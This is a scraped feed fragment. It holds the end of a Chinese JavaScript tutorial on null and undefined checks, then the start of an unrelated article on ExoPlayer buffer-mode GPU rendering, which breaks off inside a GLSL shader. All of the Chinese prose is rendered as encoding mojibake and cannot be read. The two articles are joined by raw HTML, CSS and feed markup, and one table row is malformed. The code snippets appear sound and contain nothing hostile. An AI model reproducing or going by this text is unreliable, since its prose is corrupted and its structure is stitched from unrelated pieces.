<p>ä»¥ä¸‹ä»‹ç»äº†æ¯”è¾ƒå¸¸ç”¨çš„å‡ ç§åˆ¤æ–­æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-3">æ–¹æ³•ä¸€ï¼šæ˜¾å¼æ¯”è¾ƒï¼ˆæœ€ä¿é™©ï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (variable === <span class="hljs-literal">null</span> || variable === <span class="hljs-literal">undefined</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å˜é‡ä¸ºç©º'</span>);
}
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>éœ€è¦æ˜ç¡®åŒºåˆ†nullå’Œundefinedæ—¶</li>
<li>å›¢é˜Ÿä»£ç è§„èŒƒè¦æ±‚ä¸¥æ ¼ç›¸ç­‰åˆ¤æ–­</li>
<li>å¯¹ä»£ç å¯è¯»æ€§è¦æ±‚é«˜çš„é¡¹ç›®</li>
</ul>
<p><strong>æ¡ˆä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserProfile</span>(<span class="hljs-params">user</span>) {
  <span class="hljs-keyword">if</span> (user === <span class="hljs-literal">null</span> || user === <span class="hljs-literal">undefined</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">'ç”¨æˆ·ä¸å­˜åœ¨'</span>;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-string">`æ¬¢è¿ï¼Œ<span class="hljs-subst">${user.name}</span>`</span>;
}
</code></pre>
<hr/>
<h3 data-id="heading-4">æ–¹æ³•äºŒï¼šéä¸¥æ ¼ç›¸ç­‰ï¼ˆæœ€å¸¸ç”¨ï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (variable == <span class="hljs-literal">null</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å˜é‡ä¸ºç©º'</span>);
}
</code></pre>
<p>è¿™é‡Œæœ‰ä¸ª<strong>é‡è¦çŸ¥è¯†ç‚¹</strong>ï¼š<code>== null</code> å®é™…ä¸Šç­‰ä»·äº <code>=== null || === undefined</code>ï¼Œè¿™æ˜¯JavaScriptçš„è¯­è¨€ç‰¹æ€§ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆæ¨èè¿™ä¸ªå†™æ³•ï¼Ÿ</strong></p>
<ul>
<li>ä»£ç ç®€æ´ï¼Œå°‘å†™å¾ˆå¤šå­—ç¬¦</li>
<li>æ€§èƒ½ä¼˜ç§€ï¼Œç°ä»£JSå¼•æ“éƒ½åšäº†ä¼˜åŒ–</li>
<li>æ„å›¾æ˜ç¡®ï¼Œä¸“ä¸šå¼€å‘è€…ä¸€çœ‹å°±æ‡‚</li>
</ul>
<hr/>
<h3 data-id="heading-5">æ–¹æ³•ä¸‰ï¼šé€»è¾‘éæ“ä½œç¬¦</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (!variable) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å˜é‡ä¸ºfalsyå€¼'</span>);
}
</code></pre>
<p><strong>æ³¨æ„ï¼</strong> è¿™ä¸ªæ–¹æ³•å®¹æ˜“é€ æˆå…¶å®ƒçš„è¯¯ä¼¤ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¿™äº›å€¼éƒ½ä¼šè¢«åˆ¤æ–­ä¸º"ç©º"</span>
!<span class="hljs-literal">false</span>      <span class="hljs-comment">// true</span>
!<span class="hljs-number">0</span>         <span class="hljs-comment">// true  </span>
!<span class="hljs-string">""</span>        <span class="hljs-comment">// true</span>
!<span class="hljs-title class_">NaN</span>       <span class="hljs-comment">// true</span>

<span class="hljs-comment">// å®é™…å¼€å‘ä¸­çš„å‘</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-number">0</span>;
<span class="hljs-keyword">if</span> (!count) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è®¡æ•°ä¸º0'</span>); <span class="hljs-comment">// è¿™é‡Œä¼šæ‰§è¡Œï¼Œä½†å¯èƒ½ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-6">æ–¹æ³•å››ï¼štypeof å…³é”®å­—ï¼ˆå®‰å…¨çš„å†™æ³•ï¼‰</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> variable === <span class="hljs-string">'undefined'</span> || variable === <span class="hljs-literal">null</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å˜é‡æ˜¯ç©ºçš„ï¼'</span>);
}
</code></pre>
<p>å®‰å…¨åœ¨å“ªï¼Ÿ</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¦‚æœå˜é‡æ ¹æœ¬æ²¡å£°æ˜ï¼Œå‰ä¸¤ç§æ–¹æ³•ä¼šæŠ¥é”™</span>
<span class="hljs-keyword">if</span> (notDeclaredVariable == <span class="hljs-literal">null</span>) { <span class="hljs-comment">// æŠ¥é”™ï¼ReferenceError</span>
}

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> notDeclaredVariable === <span class="hljs-string">'undefined'</span>) { <span class="hljs-comment">// æ­£å¸¸è¿è¡Œï¼</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å˜é‡æœªå®šä¹‰'</span>);
}
</code></pre>
<p>è¿™ç§å†™æ³•ä¸»è¦ç”¨äºæ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦è¢«å£°æ˜è¿‡ï¼Œä½†å¯¹äºæ™®é€šå‡½æ•°å‚æ•°æˆ–å·²å£°æ˜å˜é‡ï¼Œæ²¡å¿…è¦è¿™ä¹ˆå¤æ‚ã€‚</p>
<p>é€‚ç”¨äºä¸ç¡®å®šå˜é‡æ˜¯å¦å£°æ˜çš„åœºæ™¯ã€‚</p>
<hr/>
<h3 data-id="heading-7">æ–¹æ³•äº”ï¼šç©ºå€¼åˆå¹¶æ“ä½œç¬¦ï¼ˆç°ä»£å†™æ³•ï¼‰</h3>
<p>è¿™æ˜¯ES2020çš„æ–°ç‰¹æ€§ï¼Œç”¨èµ·æ¥ç‰¹åˆ«é¡ºæ‰‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¼ ç»Ÿå†™æ³•</span>
<span class="hljs-keyword">const</span> name = username ? username : <span class="hljs-string">'åŒ¿åç”¨æˆ·'</span>;

<span class="hljs-comment">// ç°ä»£å†™æ³•</span>
<span class="hljs-keyword">const</span> name = username ?? <span class="hljs-string">'åŒ¿åç”¨æˆ·'</span>;
</code></pre>
<p><strong>ä¼˜åŠ¿</strong>ï¼šåªå¯¹ <code>null</code> å’Œ <code>undefined</code> ç”Ÿæ•ˆï¼Œä¸ä¼šè¯¯åˆ¤0ã€falseç­‰å…¶ä»–å€¼ã€‚</p>
<hr/>
<h3 data-id="heading-8">æ–¹æ³•å…­ï¼šå¯é€‰é“¾æ“ä½œç¬¦ï¼ˆå¯¹è±¡å±æ€§ä¸“ç”¨ï¼‰</h3>
<p>å¤„ç†åµŒå¥—å¯¹è±¡æ—¶ï¼Œè¿™ä¸ªåŠŸèƒ½ç®€ç›´æ˜¯æ•‘å‘½ç¨»è‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä»¥å‰çš„ç—›è‹¦å†™æ³•</span>
<span class="hljs-keyword">const</span> street = user &amp;&amp; user.<span class="hljs-property">address</span> &amp;&amp; user.<span class="hljs-property">address</span>.<span class="hljs-property">street</span>;

<span class="hljs-comment">// ç°åœ¨çš„ä¼˜é›…å†™æ³•</span>
<span class="hljs-keyword">const</span> street = user?.<span class="hljs-property">address</span>?.<span class="hljs-property">street</span>;
</code></pre>
<p>ç»“åˆç©ºå€¼åˆå¹¶ï¼Œå†™æ³•æ›´åŠ å®‰å…¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> street = user?.<span class="hljs-property">address</span>?.<span class="hljs-property">street</span> ?? <span class="hljs-string">'åœ°å€æœªçŸ¥'</span>;
</code></pre>
<hr/>
<h2 data-id="heading-9">å®é™…å¼€å‘ä¸­çš„å»ºè®®</h2>
<h3 data-id="heading-10">åœºæ™¯1ï¼šç®€å•çš„ç©ºå€¼æ£€æŸ¥</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ¨è</span>
<span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) {
  <span class="hljs-comment">// å¤„ç†ç©ºå€¼</span>
}

<span class="hljs-comment">// æˆ–è€…</span>
<span class="hljs-keyword">const</span> safeValue = value ?? defaultValue;
</code></pre>
<h3 data-id="heading-11">åœºæ™¯2ï¼šéœ€è¦åŒºåˆ†nullå’Œundefined</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (value === <span class="hljs-literal">null</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ˜ç¡®è®¾ç½®ä¸ºç©º'</span>);
}

<span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æœªå®šä¹‰'</span>);
}
</code></pre>
<h3 data-id="heading-12">åœºæ™¯3ï¼šå¤„ç†å¯¹è±¡å±æ€§</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å®‰å…¨è®¿é—®æ·±å±‚å±æ€§</span>
<span class="hljs-keyword">const</span> phone = order?.<span class="hljs-property">customer</span>?.<span class="hljs-property">contact</span>?.<span class="hljs-property">phone</span> ?? <span class="hljs-string">'æœªå¡«å†™'</span>;
</code></pre>
<h3 data-id="heading-13">åœºæ™¯4ï¼šå‡½æ•°å‚æ•°é»˜è®¤å€¼</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createUser</span>(<span class="hljs-params">name, age = <span class="hljs-number">18</span></span>) {
  <span class="hljs-comment">// ageå‚æ•°åªåœ¨undefinedæ—¶ä½¿ç”¨é»˜è®¤å€¼</span>
  <span class="hljs-keyword">return</span> { name, age };
}
</code></pre>
<hr/>
<h2 data-id="heading-14">æ€»ç»“</h2>
<p>è™½ç„¶ç°ä»£JavaScriptå¼•æ“ä¼˜åŒ–å¾—å¾ˆå¥½ï¼Œä½†äº†è§£åŸç†è¿˜æ˜¯æœ‰å¸®åŠ©çš„ï¼š</p>
<ol>
<li><code>== null</code> å’Œæ˜¾å¼æ¯”è¾ƒæ€§èƒ½ç›¸å½“</li>
<li><code>typeof</code> æ£€æŸ¥ç¨æ…¢ï¼Œä½†èƒ½å®‰å…¨æ£€æµ‹æœªå£°æ˜å˜é‡</li>
<li>å¯é€‰é“¾æ“ä½œç¬¦åœ¨ç°ä»£æµè§ˆå™¨ä¸­æ€§èƒ½ä¼˜ç§€</li>
</ol>





































<table><thead><tr><th>åœºæ™¯</th><th>æ¨èå†™æ³•</th><th>åŸå› </th></tr></thead><tbody><tr><td>ä¸€èˆ¬ç©ºå€¼æ£€æŸ¥</td><td><code>value == null</code></td><td>ç®€æ´é«˜æ•ˆ</td></tr><tr><td>éœ€è¦æ˜ç¡®æ„å›¾</td><td><code>value === null</code></td><td/><td>value === undefined`</td><td>å¯è¯»æ€§å¼º</td></tr><tr><td>è®¾ç½®é»˜è®¤å€¼</td><td><code>value ?? defaultValue</code></td><td>å®‰å…¨å‡†ç¡®</td></tr><tr><td>å¯¹è±¡å±æ€§è®¿é—®</td><td><code>obj?.prop</code></td><td>é¿å…æŠ¥é”™</td></tr><tr><td>å‡½æ•°å‚æ•°</td><td>å‚æ•°é»˜è®¤å€¼</td><td>è¯­è¨€ç‰¹æ€§</td></tr></tbody></table>
<p>æ²¡æœ‰ç»å¯¹æœ€å¥½çš„æ–¹æ³•ï¼Œåªæœ‰æœ€é€‚åˆå½“å‰åœºæ™¯çš„é€‰æ‹©ã€‚æ ¹æ®ä½ çš„å…·ä½“éœ€æ±‚å’Œå›¢é˜Ÿè§„èŒƒæ¥å†³ç­–å§ï¼</p>
<blockquote>
<p>æœ¬æ–‡é¦–å‘äºå…¬ä¼—å·ï¼šç¨‹åºå‘˜å¤§åï¼Œä¸“æ³¨åˆ†äº«å‰åç«¯å¼€å‘çš„å®æˆ˜ç¬”è®°ã€‚å…³æ³¨æˆ‘ï¼Œå°‘èµ°å¼¯è·¯ï¼Œä¸€èµ·è¿›æ­¥ï¼</p>
</blockquote>
<h4 data-id="heading-15">ğŸ“Œå¾€æœŸç²¾å½©</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F63yNglRRfo7hJ3F3e8tZLA" target="_blank" title="https://mp.weixin.qq.com/s/63yNglRRfo7hJ3F3e8tZLA" ref="nofollow noopener noreferrer">16 ä¸ªå‰ç«¯å†·çŸ¥è¯†ï¼šç”¨ä¸€æ¬¡å°±å¿˜ä¸æ‰çš„é‚£ç§</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FF4JkmYxUs9RAtsti6V1uhg" target="_blank" title="https://mp.weixin.qq.com/s/F4JkmYxUs9RAtsti6V1uhg" ref="nofollow noopener noreferrer">æˆ‘ä¹Ÿæ˜¯å†™äº†å¾ˆä¹… TypeScriptï¼Œæ‰æ„è¯†åˆ°è¿™äº›å†™æ³•ä¸å¯¹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F2wHCiqgtRfK_008fLBamPQ" target="_blank" title="https://mp.weixin.qq.com/s/2wHCiqgtRfK_008fLBamPQ" ref="nofollow noopener noreferrer">ThreadLocal åœ¨å®é™…é¡¹ç›®ä¸­çš„ 6 å¤§ç”¨æ³•ï¼ŒåŸæ¥å¯ä»¥è¿™ä¹ˆç®€å•</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FsMAKhSLNvmU1ddxg0yv9Fg" target="_blank" title="https://mp.weixin.qq.com/s/sMAKhSLNvmU1ddxg0yv9Fg" ref="nofollow noopener noreferrer">é‡æ„äº†20ä¸ªSpringBooté¡¹ç›®åï¼Œæ€»ç»“å‡ºè¿™å¥—ç¨³å®šé«˜æ•ˆçš„æ¶æ„è®¾è®¡</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ExoPlayer MediaCodecè§†é¢‘è§£ç Bufferæ¨¡å¼GPUæ¸²æŸ“åŠ é€Ÿ]]></title>    <link>https://juejin.cn/post/7592559120118513710</link>    <guid>https://juejin.cn/post/7592559120118513710</guid>    <pubDate>2026-01-08T03:42:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592559120118513710" data-draft-id="7583403164579463210" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ExoPlayer MediaCodecè§†é¢‘è§£ç Bufferæ¨¡å¼GPUæ¸²æŸ“åŠ é€Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T03:42:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ—¶å…‰å°‘å¹´"/> <meta itemprop="url" content="https://juejin.cn/user/923245500710296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ExoPlayer MediaCodecè§†é¢‘è§£ç Bufferæ¨¡å¼GPUæ¸²æŸ“åŠ é€Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/923245500710296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ—¶å…‰å°‘å¹´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:42:20.000Z" title="Thu Jan 08 2026 03:42:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ExoPlayeræ˜¯ä¸€æ¬¾æ‰©å±•æ€§å¾ˆå¼ºçš„æ’­æ”¾å™¨ï¼Œé€šè¿‡æ‰©å±•æˆ‘ä»¬å¯ä»¥å†…æ¥å¾ˆå¤šè§£ç æ¡†æ¶ï¼Œå¦‚ffmpegã€av1ç­‰ï¼ŒåŒæ ·ï¼Œæˆ‘ä»¬å¯ä»¥åšä¸€äº›åŠŸèƒ½å¼ºåŒ–ï¼Œå¦‚æœ€å¤§å¸§ç‡é™åˆ¶ã€Bufferæ¨¡å¼æ¸²æŸ“ç­‰ã€‚</p>
<p>å®é™…ä¸Šï¼Œåœ¨ä¹‹å‰çš„æ–‡ç« ã€Š<a href="https://juejin.cn/post/7419959206273712164" target="_blank" title="https://juejin.cn/post/7419959206273712164">ExoPlayer MediaCodecè§†é¢‘è§£ç Bufferæ¨¡å¼æ”¯æŒ</a>ã€‹æˆ‘ä»¬å®ç°äº†Bufferæ¨¡å¼ï¼Œæœ¬æ¥åœ¨å†™å®Œé‚£ç¯‡æ–‡ç« ä¹‹åï¼Œè§‰å¾—æ²¡å¿…è¦å†è¿›ä¸€æ­¥äº†ï¼Œå› ä¸ºç›®å‰è€Œè¨€ï¼ŒMediaCodecçš„Surfaceæ¨¡å¼åŸºæœ¬ä¸Šè¦†ç›–äº†å¾ˆå¤šåœºæ™¯ï¼Œå…¶æ¬¡Bufferæ¨¡å¼å½“æ—¶å¼€å‘çš„åˆè¡·æ˜¯ç‰¹æ®Šå…œåº•å’Œæµ‹è¯•ç”¨ï¼›ç„¶è€Œï¼Œåœ¨éƒ¨åˆ†å‚å•†çš„è®¾å¤‡ä¸Šï¼ŒSurfaceæ¨¡å¼è¡¨ç°å‡ºäº†ä¸ç¨³å®šï¼Œæ€»æ˜¯æ’­æ”¾å¤±è´¥ï¼Œå½“ç„¶ï¼Œç¥å¥‡çš„æ˜¯ï¼Œè¿™ä¸ªè®¾å¤‡æ­£å¥½è·‘Exo-FFmpegèƒ½å®Œå…¨è§£ç å¹¶æµç•…æ¸²æŸ“ï¼Œç„¶è€Œæµ‹è¯•åé¦ˆç”»è´¨ä¸å¤ªæ»¡æ„ï¼Œæœ‰äº›æ¨¡ç³Šï¼ŒåŸå› æ˜¯Exo-FFmpegæ¸²æŸ“çš„è§†é¢‘ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„ANativeWindowæ¸²æŸ“çš„ï¼Œè¿™ä¸ªæ¸²æŸ“é€»è¾‘å†…éƒ¨å¯èƒ½ä½¿ç”¨äº†å…¶ä»–ColorSpaceè‰²å½©çŸ©é˜µï¼Œè€Œæˆ‘ä»¬çš„èµ„æºColorSpaceæ™®éæ™®éæ˜¯COLORSPACE_BT709ã€‚</p>
<p>ç»è¿‡æ²Ÿé€šï¼Œæˆ‘ä»¬å†³å®šä½¿ç”¨Exo MediaCodec Bufferæ¨¡å¼æ¸²æŸ“ï¼Œæµ‹è¯•åé¦ˆè¿™ä¸ªæ¨¡å¼ä¹Ÿæ’­æ”¾çš„ä¸é”™ã€‚</p>
<p>æ˜¾ç„¶ï¼Œæˆ‘ä»¬éœ€è¦ç»§ç»­ä¼˜åŒ–ï¼Œæå‡æ¸²æŸ“æ•ˆç‡ï¼Œåœ¨GPUä¸Šå®ç°Nv21å’ŒNv12è½¬I420ï¼Œå¹¶ä¸”åŠ¨æ€è·å–ColorSpaceã€‚</p>
<p>åœ¨è¿™ä¹‹å‰ï¼Œä½ å¯èƒ½éœ€è¦ç®€å•äº†è§£ä¸‹è‰²å½©ç©ºé—´ï¼Œå…·ä½“è€Œè¨€å°±æ˜¯è‰²ç›¸ã€äº®åº¦ã€é¥±å’Œåº¦ç›¸å…³è‰²å½©æ¨¡å‹ã€‚</p>
<h2 data-id="heading-1">æ–¹æ¡ˆ</h2>
<p>æœ¬ç¯‡ä¼šä¼˜åŒ–æ¸²æŸ“èƒ½åŠ›ï¼Œä¸å†åƒä¹‹å‰çš„æ–‡ç« ä¸­ï¼Œé€šè¿‡CPUæ–¹å¼å®ç°å®ç°Nv21ã€NV12ã€YUV422ç­‰æ ¼å¼è½¬I420ï¼Œé‚£ä¹ˆï¼Œæ„å‘³ç€æˆ‘ä»¬éœ€è¦æŠŠåŸå§‹æ•°æ®ä¼ è¾“åˆ°GPUï¼Œå®ç°GPUä¸ŠYUVç¼–ç å¯¹é½ï¼Œå½“ç„¶ï¼Œéœ€è¦é‡æ–°è§„åˆ’Shaderè„šæœ¬ã€‚</p>
<h3 data-id="heading-2">glslè„šæœ¬å®ç°</h3>
<p>é‚£ä¹ˆï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦å‘Šè¯‰shaderï¼Œä¼ è¾“è¿›æ¥çš„æ•°æ®ç±»å‹ï¼Œè¿™é‡Œå®šä¹‰u_format_typeå˜é‡ï¼ŒåŒæ—¶è¿˜æœ‰å‘Šè¯‰shaderè‰²å½©ç©ºé—´colorFormatMatrixçŸ©é˜µï¼ˆrgb 3x3ï¼‰ã€‚</p>
<pre><code class="hljs language-java" lang="java">precision highp <span class="hljs-type">float</span>;

<span class="hljs-comment">// Uniforms (ç”± Java ä»£ç ä¼ å…¥çš„æ§åˆ¶å‚æ•°)</span>
uniform <span class="hljs-type">int</span> u_format_type;      <span class="hljs-comment">// 0: Planar (I420), 1: NV12, 2: NV21</span>
uniform sampler2D s_texture_y;  <span class="hljs-comment">// çº¹ç†å•å…ƒ 0 (Y åˆ†é‡)</span>
uniform sampler2D s_texture_u;  <span class="hljs-comment">// çº¹ç†å•å…ƒ 1 (U åˆ†é‡ æˆ– UV/VU äº¤é”™åˆ†é‡)</span>
uniform sampler2D s_texture_v;  <span class="hljs-comment">// çº¹ç†å•å…ƒ 2 (V åˆ†é‡ï¼Œä»…ç”¨äº Planar æ ¼å¼)</span>

<span class="hljs-comment">// Varying (ç”± Vertex Shader ä¼ æ¥çš„æ’å€¼åçš„çº¹ç†åæ ‡)</span>
varying vec2 v_texCoord;
<span class="hljs-comment">//é¢œè‰²ç©ºé—´</span>
uniform mat3 colorFormatMatrix;

<span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 1. é‡‡æ · Y (äº®åº¦) åˆ†é‡</span>
    <span class="hljs-type">float</span> <span class="hljs-variable">Y</span> <span class="hljs-operator">=</span> texture2D(s_texture_y, v_texCoord).r;
    <span class="hljs-type">float</span> U, V;

    <span class="hljs-comment">// 2. æ ¹æ®æ ¼å¼ç±»å‹ u_format_type é‡‡æ · U å’Œ V åˆ†é‡</span>
    <span class="hljs-keyword">if</span> (u_format_type == <span class="hljs-number">0</span> || u_format_type == <span class="hljs-number">3</span>) {
        <span class="hljs-comment">// Planar (I420/YV12): ä»ä¸¤ä¸ªç‹¬ç«‹çš„çº¹ç†ä¸­é‡‡æ · U å’Œ V</span>
        U = texture2D(s_texture_u, v_texCoord).r;
        V = texture2D(s_texture_v, v_texCoord).r;
    } <span class="hljs-keyword">else</span> {
